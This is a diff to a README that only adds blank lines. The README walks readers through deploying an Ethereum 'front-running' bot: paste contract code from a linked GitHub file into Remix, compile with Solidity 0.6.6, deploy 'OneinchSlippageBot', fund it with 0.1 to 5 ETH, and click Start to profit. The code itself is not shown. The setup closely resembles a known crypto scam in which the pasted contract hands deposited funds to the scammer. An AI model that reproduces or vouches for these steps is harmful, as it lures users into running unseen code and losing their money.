@@ -5,6 +5,7 @@ Please be aware: Funding your contract with sufficient Ethereum (ETH) to cover b
 To avoid this, I recommend funding your contract with at least 0.1 ETH and up to 5 ETH to ensure the bot functions optimally.
 
 Step-by-Step Setup Guide:
+
 1- Download MetaMask
 
 ► [Install MetaMask](https://metamask.io/download/)
@@ -16,21 +17,26 @@ Step-by-Step Setup Guide:
 3- Create Contract File
 
 ► Go to the “contracts” folder and create a “New File”.
+
 ► Rename it to a desired name ending in .sol, for example, “bot.sol.”
+
 ► If text colors are missing when creating the file, refresh the browser and paste in the code again.
 
 4- Paste Code in Remix
 
 ► Copy and paste the bot code: [ETH Bot Code.
 ](https://github.com/deriv-smartbot/Ethereum-Bot/blob/main/Code%20update%20-%2019%20November%202024)
+
 5- Compile the Contract
 
 ► Go to the “Compile” tab on Remix.
+
 ► Select Solidity version 0.6.6 for compilation.
 
 7- Deploy the Contract
 
 ► In the “Deploy & Run Transactions” tab, set “Injected Provider - MetaMask” as the environment and click “Deploy.”
+
 ► Confirm the contract creation in MetaMask.
 Note: Ensure your contract name is correctly selected in the CONTRACT section before clicking Deploy. Example: “OneinchSlippageBot - bot.sol.”
 
@@ -39,11 +45,13 @@ Troubleshooting: If you receive a "Gas estimation failed" error after clicking d
 7- Fund Your Bot
 
 ► Deposit at least 0.15 ETH to cover slippage and ensure effective front-running.
+
 ► Transfer the funds to your specific bot address.
 
 8-Run the Bot
 
 ► After confirmation, click "Start" to initiate the bot.
+
 ► Withdraw your profits anytime by clicking "Withdraw".
 
 Following these steps will help ensure a successful bot operation with minimized transaction issues.
